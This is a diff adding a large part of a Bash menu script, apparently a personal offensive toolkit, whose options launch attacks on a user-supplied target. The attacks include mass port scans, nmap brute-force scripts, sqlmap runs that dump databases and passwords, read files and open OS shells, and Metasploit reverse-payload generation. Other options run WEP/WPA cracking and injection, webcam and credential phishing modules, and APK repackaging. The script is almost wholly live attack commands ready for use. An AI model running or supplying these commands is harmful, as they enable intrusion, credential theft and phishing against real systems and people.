+		dnsenum --enum --private --pages 5 --scrap 15 --whois $DOM
+		dnsmap $DOM; dnstracer $DOM
+		dnswalk -r -f -i -a -d -m -F -l $DOM
+		dnsrecon --domain $DOM -a -s -b -y -k -w -z --iw -t std rvl brt srv axfr bing yand crt snoop; fierce --domain $DOM --connect --wide
+		dnsrecon -a -s -b -y -k -w -z -d $DOM
+		dnsenum --noreverse --enum $DOM	
+		amass intel -active -list -whois -ip -ipv4 -ipv6 -active -d $DOM 
+		amass enum -active -brute -list -d $DOM	
+		assetfinder --subs-only $DOM
+		subfinder -d $DOM
+		sublist3r -v -b -d $DOM	
+		fierce --domain $DOM
+		enum4linux $DOM
+		metagoofil -d $DOM -t ALL
+		hping3 -0 -1 -2 -8 1-100 $DOM
+		netenum $DOM
+		knockpy $DOM
+		sqlmap -u http://$DOM --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3
+		sqlmap -u $DOM -p $DOM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords  --file-read="/var/www/blah.php"
+		sqlmap -u "http://$DOM.php?id=1" --dbms=mysql --tech=U --random-agent --dump
+
+                shift
+                ;;
+            --ip-scan)
+                shift
+     		read -p "enter target ip address of website:" IP
+     		#scan all ports
+     		$XT "nc -nvv -w 1 -z $IP 1-65000" &
+		$XT "masscan -p 1-9000 $IP --rate=10000" &
+		#nmap mass script scan
+		_hosts="$IP"
+		_ports="80,443"
+
+		# Set Nmap NSE scripts stack:
+		_nmap_nse_scripts="+dns-brute,\
+                   +http-auth-finder,\
+                   +http-chrono,\
+                   +http-cookie-flags,\
+                   +http-cors,\
+                   +http-cross-domain-policy,\
+                   +http-csrf,\
+                   +http-dombased-xss,\
+                   +http-enum,\
+                   +http-errors,\
+                   +http-git,\
+                   +http-grep,\
+                   +http-internal-ip-disclosure,\
+                   +http-jsonp-detection,\
+                   +http-malware-host,\
+                   +http-methods,\
+                   +http-passwd,\
+                   +http-phpself-xss,\
+                   +http-php-version,\
+                   +http-robots.txt,\
+                   +http-sitemap-generator,\
+                   +http-shellshock,\
+                   +http-stored-xss,\
+                   +http-title,\
+                   +http-unsafe-output-escaping,\
+                   +http-useragent-tester,\
+                   +http-vhosts,\
+                   +http-waf-detect,\
+                   +http-waf-fingerprint,\
+                   +http-xssed,\
+                   +traceroute-geolocation.nse,\
+                   +ssl-enum-ciphers,\
+                   +whois-domain,\
+                   +whois-ip"
+
+		# Set Nmap NSE script params:
+		_nmap_nse_scripts_args="dns-brute.domain=${_hosts},http-cross-domain-policy.domain-lookup=true,"
+		_nmap_nse_scripts_args+="http-waf-detect.aggro,http-waf-detect.detectBodyChanges,"
+		_nmap_nse_scripts_args+="http-waf-fingerprint.intensive=1"
+
+		# Perform scan:
+		nmap --script="$_nmap_nse_scripts" --script-args="$_nmap_nse_scripts_args" -p "$_ports" "$_hosts"	     		
+     		msfconsole -q -x "use auxiliary/scanner/dns/dns_amp; set RHOSTS {$IP}; set RPORT 53; run; exit' && msfconsole -q -x 'use auxiliary/gather/enum_dns; set RHOSTS {$IP}; set RPORT 53; run; exit"
+                firefox https://www.virustotal.com/pt/ip-address/$IP/information/ \
+		https://www.hybrid-analysis.com/search?host=$IP \
+		https://www.shodan.io/host/$IP \
+		https://www.senderbase.org/lookup/?search_string=$IP \
+		https://www.alienvault.com/open-threat-exchange/ip/$IP \
+		http://pastebin.com/search?q=$IP \
+		http://urlquery.net/search.php?q=$IP \
+		https://censys.io/ipv4/$IP \
+		https://www.abuseipdb.com/check/$IP \
+		https://urlscan.io/search/#$IP \
+		https://search.censys.io/hosts/$IP/data/table
+		read -p "hit enter when done" OK
+		resolveip $IP
+		nmap -A -T5 $IP -p 1-10000
+		nmap -sS $IP
+		nmap $IP -sV -sC -O -p 111,222,333
+		nmap $IP -sU
+		unicornscan -mU -v -I $IP
+		nmap $IP -p- -A -T4 -sC
+		nmap -sC -sV --stylesheet https://github.com/honze-net/nmap-bootstrap-xsl.git $IP
+		nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $IP
+		nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $IP 
+		nmap -vv -sV -sU -Pn -p 161,162 --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse $IP
+		curl https://internetdb.shodan.io/$IP
+		nmap  --script socks-brute --script-args userdb=users.txt,passdb=rockyou.txt,unpwdb.timelimit=30m -p 1080 $IP
+		nmap --script socks-brute -p 1080 $IP
+		nmap -p 1080 $IP --script socks-auth-info
+		curl -i -L $IP
+		curl $IP -s -Lc
+		curl -i $IP
+		nikto -h $IP -useproxy http://$IP:4444
+		ncat -C $IP 25
+		nc -nvv $IP 25
+		nc $IP 22
+		nc -u $IP 48772
+		read -p "hit enter when done" OK
+		telnet $IP 25
+		gobuster -u http://$IP -w $WL -s '200,204,301,302,307,403,500' -e
+		enum4linux -a $IP
+		snmp-check -t $IP -c public
+		tnscmd10g version -h $IP
+		tnscmd10g status -h $IP
+		rpcinfo -p $IP
+		rpcclient -U "" $IP
+		showmount -e $IP
+		dmitry -winsepfb $IP
+		jboss-linux $IP 80
+		fping --alive --addr --rdns --stats $IP
+		sqlmap -u http://$IP --dbms=mysql --crawl=3
+		netenum $IP
+		mysql --host=$IP -u root -p
+		sslscan $IP:443
+		ssh-keyscan $IP
+		ssldump -i wlan0
+		sslscan $IP
+		sslyze target $IP
+		tlssled $IP 80
+		smbclient -L $IP
+		smbclient //$IP/tmp
+		smbclient //$IP/ipc$ -U john
+		https://search.censys.io/hosts/$IP/data/table
+		nmap --script http-methods --script-args http-methods.url-path='/test' $IP
+		nmap --script=http-enum -p80 -n $IP/24
+		nmap --script brute -Pn $IP
+		nmap --script=mysql-brute $IP
+		wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $IP:60080/?FUZZ=test 
+		wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $IP:60080/?page=FUZZ 
+		wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$IP:60080/?page=mailer&mail=FUZZ"
+		wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $IP/FUZZ
+		wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $IP/FUZZ
+		sqlmap -o -u http://$IP/index.php --forms --dbs
+		sqlmap -o -u "http://$IP/vuln-form" --forms -D database-name -T users --dump
+		sqlmap -u http://$IP --crawl=1
+		sqlmap –u http://$IP/blog/index.php?search –dbs
+		sqlmap –u http://$IP/blog/index.php?search= –dbs –D oscommerce –tables –dumps
+		sqlmap -u http://$IP/comment.php?id=738 --dbms=mysql --dump -threads=5		
+                shift
+                ;;
+            --url-scan)
+                shift
+                read -p "enter full https url of website:" URL
+                sqlmap --dbms=mysql -u "$URL" --dbs
+		sqlmap --dbms=mysql -u "$URL" --os-shell
+		sqlmap --dbms=mysql -u "$URL" --sql-shell 
+		cd $MOD_DIR/URL_SCRAPE/ && python3 TheScrapper.py -u $URL -c -b -s
+		cd $MOD_DIR/socid-extractor/ && python run.py --url $URL
+                mech-dump --all --absolute --links $URL
+		linkchecker $URL
+		scrapy fetch $URL 
+		arjun -u $URL
+             	cadaver $URL
+		davtest -cleanup -url $URL
+		joomscan $URL
+		hakrawler $URL
+		wapiti -u $URL
+		nuclei -ut
+		nuclei -target $URL
+		wpscan --url $URL
+		joomscan -u $URL
+		gospider --site $URL -a
+		xsser --all=$URL
+		commix --all -u $URL
+		wafw00f --findall $URL 
+		dirb $URL
+		dirsearch -u $URL
+		dirbuster -HOLD -u $URL
+		whatweb -a 3 $URL
+		lbd $URL
+		nikto -ask auto -host $URL
+		gobuster dir --url $URL --wordlist $WL
+		gobuster dir -u $URL -e -w $WL
+		uniscan -j -g -r -s -d -e -w -q -u $URL
+		sqlmap --url="$URL" -p username --user-agent=SQLMAP --threads=10 --eta --dbms=MySQL --os=Linux \
+		--banner --is-dba --users --passwords --current-user --dbs
+		
+                shift
+                ;;
+            --cyberchef)
+                shift
+                cyberchef
+                shift
+                ;;
+            --censys)
+                shift
+                CEN='/home/snuff/Desktop/MENU/MODULES/censys' 
+		python3 $CEN config
+		python3 $CEN hnri
+		python3 $CEN asm
+		python3 $CEN search
+                shift
+                ;;                                                                                                                                                              --scan-as)
+                shift
+                read -p "enter AS number for bgp:" AS
+		whois -h whois.radb.net -- "-i origin ${AS}" | \
+		grep "^route:" | \
+		cut -d ":" -f2 | \
+		sed -e 's/^[ \t]//' | \
+		sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4 | \
+		cut -d ":" -f2 | \
+		sed -e 's/^[ \t]/allow /' | \
+		sed 's/$/;/' | \
+		sed 's/allow  */subnet -> /g'
+		asn $AS
+                shift
+                ;; 
+              --sf-osint)
+                shift
+                read -p "target could be phone, email, ip, domain:" TARGET
+		spiderfoot -m all -s $TARGET -u all --type all
+                shift
+                ;; 
+              --fping)
+              	shift
+              	read -p "enter intrerface" IFACE
+              	fping -I $IFACE -m -a  -s
+              	shift
+              	;;
+              --masky)
+              	shift
+              	read -p "enter target ip or cidr range or hostname:" TARG
+              	masky $TARG
+              	shift
+              	;;
+              --get-fucked)
+              	shift
+              	ifconfig; iwconfig
+              	airmon-ng start wlan0
+              	$XT "airodump-ng $MONITOR_IFACE" &
+            #  	read -p "enter iface:" IFACE
+              	read -p "enter ssid of target:" SSID
+              	read -p "enter bssid to repeat:" BSSID
+              	$XT "airtun-ng -a $BSSID -e $SSID -t 0 $MONITOR_IFACE" &
+              	$XT "airtun-ng -a $BSSID -e $SSID -t 1 $MONITOR_IFACE" &
+              	$XT "airtun-ng -a $BSSID -e $SSID -t 2 --repeat -s $BSSID $MONITOR_IFACE" &
+              	$XT "airventriloquist-ng -d -e $SSID -i $MONITOR_IFACE" &
+          #      ifconfig; read -p "enter own mac" MAC
+      		$XT "aireplay-ng -3 -b $BSSID $MONITOR_IFACE" &
+		$XT "aireplay-ng --chopchop -b $BSSID $MONITOR_IFACE" &
+		$XT "packetforge-ng -0 -a $BSSID -k 255.255.255.255 -l 255.255.255.255 -y 1122out.xor - w chop-out" &
+		$XT "aireplay-ng -2 -r chop-out $MONITOR_IFACE" &
+	        $XT "aireplay-ng --fakeauth 0 -a $BSSID $MONITOR_IFACE" &
+		# ARP request reply
+	        $XT "aireplay-ng -3 -b $BSSID $MONITOR_IFACE" &		              	
+              	shift
+              	;;
+              --http-cli)
+              	shift             	
+              	read -p "enter url:" URL
+              	read -p "enter method  GET | POST | PUT | PATCH | DELETE | OPTIONS | HEAD" METHOD
+              	httpclient get $URL
+              	if [[ "$METHOD" = "GET" ]]; then
+              	httpx $URL -m GET --follow-redirects --no-verify --http2 -v
+              	fi
+              	if [[ "$METHOD" = "POST" ]]; then
+              	httpx $URL -m POST --follow-redirects --no-verify --http2 -v
+              	fi
+              	if [[ "$METHOD" = "PUT" ]]; then
+              	httpx $URL -m PUT --follow-redirects --no-verify --http2 -v
+              	fi
+              	if [[ "$METHOD" = "PATCH" ]]; then
+              	httpx $URL -m PATCH --follow-redirects --no-verify --http2 -v 
+              	fi
+              	if [[ "$METHOD" = "DELETE" ]]; then             	
+              	httpx $URL -m DELETE --follow-redirects --no-verify --http2 -v  
+              	fi
+              	if [[ "$METHOD" = "OPTIONS" ]]; then
+              	httpx $URL -m OPTIONS --follow-redirects --no-verify --http2 -v              	
+              	fi 
+              	if [[ "$METHOD" = "HEAD" ]]; then
+              	httpx $URL -m HEAD --follow-redirects --no-verify --http2 -v              	
+              	fi               	       	
+ #             	if [[ "" = "" ]]; then
+  #            	fi 
+   #           	if [[ "" = "" ]]; then
+    #          	fi               	              	
+              	shift
+              	;;
+              --hydra-pass-automated)
+              	shift
+		hydra-wizard              	
+              	shift
+              	;;
+              --msf-create-payload)
+              	shift
+              #	msfpc $TYPE (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>)
+              	read -p "type: APK | ASP | ASPX | Bash | Java | OSX | Perl | Powershell | Python | PHP | Tomcat | Windows :" TYPE
+		read -p "ENTER A DOM OR IP :" OPT1
+		read -p "BIND 	or  REVERSE :" OPT2
+		read -p "STAGED OR STAGELESS :" OPT3
+		read -p "TCP | HTTP | HTTPS | FIND_PORT :" OPT4
+		read -p "BATCH | LOOP :" OPT5
+		msfpc $TYPE $OPT1 $OPT2 $OPT3 $OPT4 $OPT5		
+              	shift
+              	;;
+              --crack-pcap)
+              	shift
+              	read -p "enter ap bsside:" BSSID
+		read -p "enter path to cap file:" CAPFILE
+		airdecap-ng -b $BSSID $CAPFILE
+              	shift                                                                                                            
+                ;;
+              --fastboot)
+              	shift
+              	cd /home/snuff/Desktop/MENU/MODULES/android/platform-tools/
+              	METHOD=$(zenity --entry --text="enter method: LIST_DEVICES | GET_VARS | HELP | REBOOT_RECOVERY | REBOOT_BOOTLOADER | FLASH_BOOT | FLASH_RECOVERY")
+              	if [[ "$METHOD" = "LIST_DEVICES" ]]; then
+		fastboot devices -l
+              	fi 
+              	if [[ "$METHOD" = "HELP" ]]; then
+              	fastboot --help
+              	fi
+              	if [[ "$METHOD" = "GET_VARS" ]]; then
+                fastboot getvar all
+              	fi
+              	if [[ "$METHOD" = "REBOOT_RECOVERY" ]]; then
+		fastboot reboot recovery
+              	fi 
+              	if [[ "$METHOD" = "REBOOT_BOOTLOADER" ]]; then
+		fastboot reboot bootloader
+              	fi 
+              	if [[ "$METHOD" = "FLASH_BOOT" ]]; then
+              	read -p "path to .img:" IMG
+		fastboot flash boot $IMG
+              	fi
+              	if [[ "$METHOD" = "FLASH_RECOVERY" ]]; then
+              	read -p "path to .img:" IMG
+              	fastboot flash recovery $IMG
+              	fi            	              	             	              	             	              	              	                
+              	shift
+              	;;
+              --adb-lp)
+              	shift
+              	$ADB shell pm list packages
+              	shift
+              	;;
+              --adb-wm)
+              	shift
+              	read -p "enter size" SIZE
+              	$ADB shell wm density $SIZE
+              	shift
+              	;;
+              --adb-pair)
+              	shift
+              	IP=$(zenity --entry --text="enter ip address")
+              	PORT=$(zenity --entry --text="enter PORT")
+              	PAIR=$(zenity --entry --text="enter pairing CODE")
+		$ADB pair $IP:$PORT $PAIR
+              	shift
+              	;;
+              --adb-set-batt)
+              	shift
+              	LVL=$(zenity --entry --text="what percent to set battery")
+              	$ADB shell dumpsys battery set level $LVL	              	
+              	shift
+              	;;
+              --adb-con-tcp)
+              	shift
+              	IP=$(zenity --entry --text="enter ip address")
+              	PORT=$(zenity --entry --text="enter PORT")
+		$ADB connect $IP:$PORT
+              	shift
+              	;;
+              --adb-list-dev)
+              	shift
+		$ADB devices -l              	
+              	shift
+              	;;
+              --adb-ss)
+              	shift
+		$ADB start-server              	
+              	shift
+              	;;
+              --adb-sts)
+              	shift
+		$ADB kill-server              	
+              	shift
+              	;;
+              --adb-usb)
+              	shift
+		$ADB usb              	
+              	shift
+              	;;
+              --adb-help)
+              	shift
+              	$ADB --help              	
+              	shift
+              	;;
+              --adb-call)
+              	shift
+		NUM=$(zenity --entry --text="ENTER PHONE NUMBER")
+		$ADB shell am start -a android.intent.action.CALL -d tel:+$NUM // Make a call              	              	
+              	shift
+              	;;
+              --adb-send-text)
+              	shift
+		NUM=$(zenity --entry --text="ENTER PHONE NUMBER")
+		TEXT=$(zenity --entry --text="ENTER TEXT TO SEND")
+		$ADB shell am start -a android.intent.action.SENDTO -d sms:+$NUM--es  sms_body "$TEXT" --ez exit_on_sent false              	              	
+              	shift
+              	;; 
+              --adb-home-buttom)
+              	shift
+		$ADB shell am start -W -c android.intent.category.HOME -a android.intent.action.MAIN              	              	
+              	shift
+              	;; 
+              --adb-reset-perm)
+              	shift
+		PACK=$(zenity --entry --text="ENTER PACKAGE NAME EX: com.some.package")
+		$ADB shell pm reset-permissions -p $PACK              	              	
+              	shift
+              	;; 
+              --adb-grant-perm)
+              	shift
+		PACK=$(zenity --entry --text="ENTER PACKAGE NAME EX: com.some.package")
+		PERMISSION=$(zenity --entry --text="ENTER PERMSISSION TO GRANT")
+		$ADB shell pm grant $PACK $PERMISSION              	              	
+              	shift
+              	;; 
+              --adb-revoke-perm)
+              	shift
+		PACK=$(zenity --entry --text="ENTER PACKAGE NAME EX: com.some.package")
+		PERMISSION=$(zenity --entry --text="ENTER PERMSISSION TO REVOKE")
+		$ADB shell pm revoke $PACK $PERMISSION              	              	
+              	shift
+              	;; 
+              --adb-bright-up)
+              	shift
+		$ADB shell input keyevent 221              	              	
+              	shift
+              	;; 
+              --adb-bright-down)
+              	shift
+		$ADB shell input keyevent 220              	              	
+              	shift
+              	;; 
+              --adb-contacts)
+              	shift
+		$ADB shell input keyevent 207              	              	
+              	shift
+              	;; 
+              --adb-open-cam)
+              	shift
+		$ADB shell input keyevent 27              	              	
+              	shift
+              	;;               	              	              	              	              	              	              	              	                          --adb-print-text)
+              	shift
+		TEXT=$(zenity --entry --text="ENTER TEXT TO PRINT")
+		$ADB shell input text "$TEXT"              	              	
+              	shift
+              	;;               	              	              	              	              	              	              	              	                          --adb-hit-enter)
+              	shift
+              	$ADB shell input keyevent 66              	
+              	shift
+              	;;               	              	              	              	              	              	              	              	                          --adb-open-web)
+              	shift
+              	$ADB shell input keyevent 64              	
+              	shift
+              	;;               	              	              	              	              	              	              	              	                          --adb-unin)
+              	shift
+              	PACK=$(zenity --entry --text="ENTER PACKAGE NAME EX: com.some.package")
+		$ADB shell pm uninstall --user 0 $PACK          	              	
+              	shift
+              	;;               	              	              	              	              	              	              	              	                          --adb-reboot-rec)
+              	shift
+              	$ADB reboot-recovery              	
+              	shift
+              	;;               	              	              	              	              	              	              	              	                          --adb-reboot-bootloader)
+              	shift
+		$ADB reboot fastboot
+		$ADB reboot-bootloader
+              	shift
+              	;;               	              	              	              	              	              	              	              	                          --adb-bkup-all)
+              	shift
+              	$ADB backup -shared -apk -all -f backup.ab              	
+              	shift
+              	;;               	              	              	              	              	              	              	              	              	            	            	            	           	            	            	            	            	
+              --add-vlan)
+              	shift
+		IP=$(zenity --entry --text="enter ip address to create for vlan")              	
+              	IFACE=$(zenity --entry --text="enter iface")
+              	VLANID=$(zenity --entry --text="enter vlan id ex: 10")
+              	vconfig add $IFACE $VLANID
+		ifconfig $IFACE.$VLANID $IP/24 up
+              	shift
+              	;;
+              --adb-service-list)
+              	shift
+              	$ADB shell service list
+              	shift
+              	;;
+	      --adb-list-phone-feat)
+	      	shift
+	      	$ADB shell pm list features
+	      	shift
+	      	;;
+	      --system-log)
+	      	shift
+	      	dmesg -H --reltime --follow-new 
+	      	shift
+	      	;;
+	      --lazy-script)
+	      	shift
+	      	cd /home/snuff/Desktop/MENU/MODULES/lscript-master && bash ./l
+	      	shift
+	      	;;
+	      --phone-cam-phish)
+	      	shift
+	      	cd /home/snuff/Desktop/MENU/MODULES/WcamPhish-main/ && bash wcamphish.sh
+	      	shift
+	      	;;
+	      --apk-file-edit-sign)
+	      	shift
+		apktool decode base.apk -o decoded
+		apktool build -f decoded -o repackaged.apk
+		zipalign -v 4 repackaged.apk
+
+		zipalign -c -v 4 repackaged.apk
+		keytool -genkey -keyalg RSA -validity 365 -keysize 2048 -storetype PKCS12 -alias apk_rsa_priv -keystore apk_rsa_priv.key -storepass 12345678
+		apksigner sign --ks apk_rsa_priv.key --ks-pass "pass:12345678" repackaged.apk
+		jarsigner -sigalg SHA256withRSA -digestalg SHA-256 -tsa http://timestamp.digicert.com -keystore apk_rsa_priv.key -storepass 12345678 repackaged.apk apk_rsa_priv
+		apksigner verify repackaged.apk
+		jarsigner -verify -verbose -certs repackaged.apk	      	
+	      	shift
+	      	;;
+	      --social-media-scrape-gui)
+	      	shift
+	      	cd /home/snuff/Desktop/MENU/MODULES/reaper/ && python3 reaper.py
+	      	shift
+	      	;;
+	      --wpa-handshake)
+	      	shift
+	      	CH=$(zenity --entry --text="channel number")    
+	      	          	
+	      	airodump-ng wlan0mon --channel $CH -w /home/snuff/Desktop/MENU/LOGS/airodump_essid_results --essid $SSID --bssid FF:FF:FF:FF:FF:FF
+	      	shift
+	      	;;
+	      --top-links)
+	      	shift
+	      	echo ' https://www.gl.com/maps-sigtran.html
+	      	     
+		       https://www.webcrawler.com/
+		       https://www.etools.ch/'
+	      	shift
+	      	;;
+	      --grab-ssl)
+	      	shift
+	        DOM=$(zenity --entry --text="ENTER DOMAIN")    
+	      	keytool -printcert -rfc -sslserver $DOM
+	      	openssl x509 -noout -text -in $DOM
+	      	shift
+	      	;;
+	      --extract-web-info)
+	      	shift
+	        DOM=$(zenity --entry --text="ENTER DOMAIN")    	      	
+	      	urlextractor $DOM
+	      	shift
+	      	;;
+	      --phishery)
+	      	shift
+	      	phishery
+	      	shift
+	      	;;
+	      --hakrawler)
+	      	shift
+	      	touch /home/snuff/Desktop/urls.txt
+	      	mousepad /home/snuff/Desktop/urls.txt
+	      	cat urls.txt | hakrawler
+	      	shift
+	      	;;
+	      --url-watch-4-changes)
+	      	shift
+		mousepad /home/snuff/Desktop/MENU/MODULES/urlwatch.txt
+		urlwatch --urls /home/snuff/Desktop/MENU/MODULES/urlwatch.txt	      	
+	      	shift
+	      	;;
+              	 *)
+                echo  "Invalid parameter:" 1>&2
+                exit 1
+                ;;
+        esac
+    done
+}               
+parse_user_options "$@"
+#osmo-stp
+#sn0int
+#xprop
+#xdotool
+#xhost
+
+#fantaip -i wlan0 127.0.0.1
